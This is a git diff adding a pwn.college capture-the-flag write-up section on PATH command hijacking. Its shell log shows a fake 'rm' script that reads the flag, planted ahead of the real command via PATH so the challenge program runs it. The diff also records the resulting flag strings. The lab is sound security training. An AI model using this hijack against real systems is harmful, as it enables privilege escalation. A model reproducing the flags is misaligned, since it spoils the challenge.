@@ -40,3 +40,18 @@ hacker@path~adding-commands:~$ /challenge/run
 Invoking 'win'....
 pwn.college{Mq0cUGMy1Ilm2ksIeXgjgfT1wsY.dZzNyUDLzkTN0czW}
 ```
+# Hijacking Commands-
+```bash
+Connected!
+hacker@path~hijacking-commands:~$ echo > 'cat /flag' > rm
+ssh-entrypoint: cat /flag: No such file or directory
+hacker@path~hijacking-commands:~$ ech 'cat flag' > rm
+ssh-entrypoint: ech: command not found
+hacker@path~hijacking-commands:~$ echo 'cat /flag' > rm
+hacker@path~hijacking-commands:~$ PATH="/home/hacker:$PATH"
+hacker@path~hijacking-commands:~$ chmod a+x rm
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker/rm. Executing!
+pwn.college{UpBaGQ9Uuff4THoQJBCaLhrv6rQ.ddzNyUDLzkTN0czW}
+```
